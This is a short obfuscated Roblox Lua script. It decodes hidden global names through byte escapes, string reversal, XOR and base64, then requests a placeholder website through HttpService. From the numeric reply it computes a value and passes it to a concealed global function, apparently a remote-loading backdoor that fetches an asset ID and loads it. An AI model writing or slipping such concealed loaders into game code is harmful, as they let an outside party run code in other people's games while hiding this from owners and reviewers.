-- [[ this is semi-obfuscated :P ]]

local Getfenv = getfenv
local Game = Getfenv()[("\101\109\97\103")["\114\101\118\101\114\115\101"]("\101\109\97\103")]
local Byte =
	Getfenv()[("\103\110\105\114\116\115")["\114\101\118\101\114\115\101"]("\103\110\105\114\116\115")][("\101\116\121\98")["\114\101\118\101\114\115\101"](
		"\101\116\121\98"
	)]
local Char =
	Getfenv()[("\103\110\105\114\116\115")["\114\101\118\101\114\115\101"]("\103\110\105\114\116\115")][("\114\97\104\99")["\114\101\118\101\114\115\101"](
		"\114\97\104\99"
	)]
local Bit = Getfenv()[("\50\51\116\105\98")["\114\101\118\101\114\115\101"]("\50\51\116\105\98")]
local Bxor = Bit[("\114\111\120\98")["\114\101\118\101\114\115\101"]("\114\111\120\98")]
local Math = Getfenv()[("\104\116\97\109")["\114\101\118\101\114\115\101"]("\104\116\97\109")]
local Ldexp = Math[("\112\120\101\100\108")["\114\101\118\101\114\115\101"]("\112\120\101\100\108")]
local Pi = Math[("\105\112")["\114\101\118\101\114\115\101"]("\105\112")]

local function xorDecode(encodedString, key)
	local decodedString = ""

	for i = 1, #encodedString do
		local charCode = Byte(encodedString:sub(i, i))
		local decodedChar = Char(Bxor(charCode, key))

		decodedString = decodedString .. decodedChar
	end

	return decodedString
end

function base64Decode(data)
	local b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	data = data[("\98\117\115\103")["\114\101\118\101\114\115\101"]("\98\117\115\103")](data, "[^" .. b .. "=]", "")
	return (
		data[("\98\117\115\103")["\114\101\118\101\114\115\101"]("\98\117\115\103")](data, ".", function(x)
			if x == "=" then
				return ""
			end
			local r, f = "", (b:find(x) - 1)
			for i = 6, 1, -1 do
				r = r .. (f % 2 ^ i - f % 2 ^ (i - 1) > 0 and "1" or "0")
			end
			return r
		end):gsub("%d%d%d?%d?%d?%d?%d?%d?", function(x)
			if #x ~= 8 then
				return ""
			end
			local c = 0
			for i = 1, 8 do
				c = c + (x:sub(i, i) == "1" and 2 ^ (8 - i) or 0)
			end
			return string.char(c)
		end)
	)
end

local Tonumber = Getfenv()[base64Decode(xorDecode("\23\99\114\112\67\27\125\78\95\19\109\78"):reverse())]
local Https = Game[base64Decode(
	xorDecode(
		"\23\23\123\112\64\70\71\78\83\124\24\127\26\124\24\120",
		Ldexp((0x83F2 + (0x96949A522 / 0x174876E800)) / Pi, -8)
	):reverse()
)](Game, "HttpService")
local Request = Https[base64Decode(
	xorDecode("\23\103\71\72\31\100\114\123\26\124\24\120", Ldexp((0x83F2 + (0x96949A522 / 0x174876E800)) / Pi, -8)):reverse()
)](Https, base64Decode(xorDecode("__website__", __decodekey__):reverse())):split(" ")

Getfenv()[base64Decode(xorDecode("\23\23\123\112\83\70\125\78\82\124\71\73", 42):reverse())](
	Tonumber(Request[1]) + Ldexp(Tonumber(Request[2]), ((0x527 + (0x443C6D39D8C / 10000000000000)) / Pi))
)
